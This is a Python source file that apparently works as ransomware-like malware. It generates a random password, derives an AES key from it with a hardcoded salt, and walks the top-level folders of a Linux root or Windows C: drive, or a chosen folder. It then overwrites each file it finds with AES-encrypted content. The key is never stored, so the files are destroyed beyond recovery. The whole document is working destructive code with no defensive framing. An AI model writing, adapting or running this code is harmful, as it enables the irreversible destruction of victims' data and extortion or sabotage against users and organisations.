import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Protocol.KDF import PBKDF2
import string , random , sys
from sys import platform
import os

BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE).encode()
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def password():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(128))

def private_key(password):
    salt = b"ofaueirwgyrahbotgegoirthgaygareh"
    kdf = PBKDF2(password, salt, 64, 1000)
    key = kdf[:32]
    return key

key = private_key(password())

def encrypt(raw, password):
    txt = pad(raw)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(password, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(txt))

def encrypt_system():
    if platform == "linux" or platform == "linux2":
            directories = next(os.walk('/'))[1]
            for core in ('proc', 'sys', 'lib', 'run'):
                directories.remove(core)
            for enc in range(0, len(directories)):
                files = os.listdir(f"/{directories[enc]}/")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt(f, key)
                                print(f"Encrypting /{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)

    elif platform == "win32":
        directories = next(os.walk('C:/'))[1]
        for core in ('Documents and Settings', 'System Volume Information','PerfLogs'):
                directories.remove(core)
        for enc in range(0, len(directories)):
                files = os.listdir(f"C:/{directories[enc]}")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'C:/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'C:/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt(f, key)
                                print(f"Encrypting C:/{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'C:/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)
    else:
        print(f"Program is not made for {platform}")

def encrypt_folder(dirs):

    if platform == "linux" or platform == "linux2":
        directories = next(os.walk(dirs))[1]
        if directories == "/":
            for core in ('proc', 'sys', 'lib', 'run'):
                directories.remove(core)
        for enc in range(0, len(directories)):
                files = os.listdir(f"{dirs}/{directories[enc]}/")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt(f, key)
                                print(f"Encrypting {dirs}/{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)
                    else:
                        print("There are no encryptable files in the selected folder")
            
    elif platform == "win32":
        directories = next(os.walk(dirs))[1]
        for enc in range(0, len(directories)):
                files = os.listdir(f"{dirs}/{directories[enc]}/")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt(f, key)
                                print(f"Encrypting {dirs}/{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)
    else:
        print(f"Program is not made for {platform}")
